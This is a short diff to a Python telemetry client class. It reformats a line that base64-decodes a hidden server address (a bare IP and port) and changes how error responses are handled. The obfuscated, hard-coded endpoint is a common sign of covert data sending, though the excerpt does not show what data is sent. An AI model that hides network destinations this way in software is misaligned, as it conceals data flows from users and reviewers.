@@ -19,7 +19,9 @@ class TelemetryError(Exception):
 class TelemetryClient:
     """Клиент для отправки телеметрии на сервер."""
 
-    server_address = base64.b64decode('aHR0cDovLzMxLjEzMS4yNTEuMTA3OjU0MTU2').decode()
+    server_address = base64.b64decode(
+        "aHR0cDovLzMxLjEzMS4yNTEuMTA3OjU0MTU2"
+    ).decode()
 
     def __init__(
         self,
@@ -53,8 +55,12 @@ class TelemetryClient:
 
         try:
             response = self.session.post(url, json=data)
-            response.raise_for_status()
-            return response.json()
+            # response.raise_for_status()
+            result = response.json()
+            if "error" in result:
+                raise TelemetryError(result)
+            return result
+
         except (
             requests.exceptions.RequestException,
             json.JSONDecodeError,
